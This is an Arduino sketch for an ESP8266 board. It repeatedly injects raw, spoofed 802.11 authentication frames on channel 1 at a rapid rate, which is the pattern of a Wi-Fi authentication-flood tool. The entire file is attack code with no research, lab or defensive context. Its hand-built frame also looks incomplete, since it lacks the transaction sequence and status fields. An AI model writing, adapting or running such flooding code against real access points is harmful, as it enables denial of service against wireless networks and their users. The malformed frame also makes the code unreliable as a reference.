#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

uint8_t authPacket_simplified[26] = {
  0xB0, 0x00, // Frame Control: Authentication (Type 0, Subtype 11) - Little Endian
  0x00, 0x00, // Duration/ID (typically 0 in these frames)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Address 1: Destination (Broadcast)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Address 2: Source (Your ESP's MAC or spoofed)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Address 3: BSSID (AP's MAC or spoofed)
  0x00, 0x00, // Sequence Control (usually managed by hardware, but part of header)
  0x00, 0x00  // Authentication Algorithm Number (0 for Open System)
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);  // Set WiFi to station mode
  wifi_set_opmode(STATION_MODE); // Set operation mode to station
  wifi_set_channel(1); // Set the channel
  Serial.println("Sending Authentication frames...");
}

void loop() {
  // Send the raw authentication packet
  int result = wifi_send_pkt_freedom(authPacket_simplified, sizeof(authPacket_simplified), 0);

  if (result != 0) {
    Serial.printf("Failed to send Authentication packet, error: %d\n", result);
  }

  delay(10); // Control the sending rate
}